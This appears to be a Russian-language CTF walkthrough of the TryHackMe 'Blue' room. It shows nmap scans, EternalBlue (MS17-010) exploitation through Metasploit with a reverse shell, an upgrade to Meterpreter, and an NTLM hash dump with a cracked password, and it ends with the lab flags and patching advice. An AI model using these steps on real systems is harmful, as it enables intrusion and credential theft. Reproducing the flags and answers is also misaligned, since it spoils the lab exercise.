# Blue

**Сложность:** Easy

<img width="100" height="100" alt="image" src="ССЫЛКА_НА_ИКОНКУ" />

| | |
|---|---|
| **Платформа** | TryHackMe |
| **Ссылка** | https://tryhackme.com/room/blue |
| **ОС** | Windows |
| **Теги** | `smb`, `eternalblue`, `metasploit`, `privesc` |

## Кратко

Windows-машина с открытым SMB, уязвимым к EternalBlue (MS17-010). Эксплуатация через Metasploit сразу дает сессию с правами `NT AUTHORITY\SYSTEM`, после чего остается собрать хеши пользователей и найти три флага, разложенных по системе.

## 1. Разведка

### Сканирование портов

```bash
nmap -sS -sV 10.81.142.187
```

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-12 15:01 -0400
Nmap scan report for 10.81.142.187
Host is up (0.051s latency).
Not shown: 993 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Сканирование на уязвимости

```bash
nmap --script vuln 10.81.142.187
```

```
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
|_ssl-ccs-injection: No reply from server (TIMEOUT)

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
```

Обнаружена критическая уязвимость **EternalBlue (MS17-010, CVE-2017-0143)**.

## 2. Получение доступа

Эксплуатация через Metasploit:

```bash
msfconsole
search EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
show options
```

Устанавливаем параметры: `rhosts` — целевой IP, `lhost` — свой IP, остальное по умолчанию. Задаем полезную нагрузку и запускаем:

```
set payload windows/x64/shell/reverse_tcp
run
```

Сессия не всегда устанавливается с первой попытки — в этом случае целевую машину нужно перезагрузить и повторить запуск. После получения шелла уходим в фон через `CTRL+Z`.

### Повышение сессии до Meterpreter

```
use post/multi/manage/shell_to_meterpreter
```

Указываем верный `Lhost` и номер сессии в `session`, запускаем апгрейд. Проверяем результат:

```
sessions
getuid
```

```
NT AUTHORITY\SYSTEM
```

Доступ получен сразу с максимальными привилегиями. Просматриваем процессы и мигрируем в более стабильный:

```
ps
migrate PID
```

Мигрировали в процесс `spoolsv.exe`.

## 3. Сбор учетных данных

Дамп хешей пользователей:

```
hashdump
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Хеш пользователя Jon взломан через **crackstation.net**: пароль — `alqfna22`.

## Флаги

Поскольку доступ получен сразу с правами SYSTEM, эскалация привилегий не требовалась — вместо этого по системе разложены три флага.

**Флаг 1** (корень системы):
```
flag{access_the_machine}
```

**Флаг 2** (директория хранения паролей `C:/Windows/system32/config/`):
```
flag{sam_database_elevated_access}
```

**Флаг 3** (найден через поиск по системе):

```bash
search -f flag3.txt
```

Путь: `c:\Users\Jon\Documents\flag3.txt`

```
flag{admin_documents_can_be_valuable}
```

## Выводы

- EternalBlue (MS17-010) — критическая уязвимость SMBv1, дающая немедленный RCE с правами SYSTEM без необходимости отдельной эскалации привилегий.
- Хеши NTLM без соли для простых паролей тривиально взламываются онлайн-сервисами вроде crackstation.net.
- Для защиты: отключить протокол SMBv1, своевременно устанавливать обновления безопасности (патч для MS17-010 вышел еще в марте 2017), использовать сложные пароли.

## Использованные инструменты

`nmap`, Metasploit (`msfconsole`), crackstation.net
